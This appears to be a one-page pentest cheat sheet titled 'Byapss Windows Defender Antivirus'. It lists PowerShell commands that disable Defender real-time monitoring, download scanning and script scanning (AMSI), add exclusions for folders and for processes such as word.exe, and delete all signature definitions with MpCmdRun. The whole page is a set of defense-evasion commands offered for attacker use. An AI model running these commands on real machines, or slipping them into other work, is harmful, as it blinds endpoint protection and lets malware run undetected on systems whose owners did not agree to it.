---
description: Byapss Windows Defender Antivirus
---

# 🟢 Windows Defender Antivirus

### Check status of Defender

```
PS C:\> Get-MpComputerStatus
```

### Disable scanning all downloaded files and attachments, disable AMSI (reactive)

```
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
```

### Disable AMSI (set to 0 to enable)

```
PS C:\> Set-MpPreference -DisableScriptScanning 1
```

### Exclude a folder

```
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
```

### Remove signatures

{% hint style="info" %}
if the Internet connection is present, they will be downloaded again
{% endhint %}

{% code overflow="wrap" %}
```
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
{% endcode %}
